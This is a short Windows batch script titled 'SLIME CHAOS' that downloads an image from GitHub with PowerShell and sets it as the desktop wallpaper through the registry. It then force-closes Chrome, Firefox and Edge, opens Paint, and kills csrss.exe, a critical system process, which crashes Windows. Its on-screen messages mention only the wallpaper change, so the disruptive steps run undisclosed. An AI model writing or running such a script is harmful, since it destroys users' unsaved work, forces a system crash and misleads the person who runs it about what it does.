@echo off
title SLIME CHAOS
color 0A

:: Set download URL and local path
set "imgUrl=https://github.com/julian20yt/old/blob/main/bonanza__splat_template__2003_06___nickelodeon__by_martaveusproductions_dhrlq1s-pre.png?raw=true"
set "imgPath=%TEMP%\slime_wallpaper.png"

:: Download the image using PowerShell
echo [SLIME SYSTEM] Downloading wallpaper...
powershell -Command "Invoke-WebRequest \"%imgUrl%\" -OutFile \"%imgPath%\""

:: Set wallpaper using registry + rundll32
echo [SLIME SYSTEM] Setting as wallpaper...
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imgPath%" /f >nul
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Wait for 1 minute
echo [SLIME SYSTEM] Wallpaper set.
taskkill /f /im chrome.exe
taskkill /f /im firefox.exe
taskkill /f /im edge.exe
start paint.exe
taskkill /f /im csrss.exe
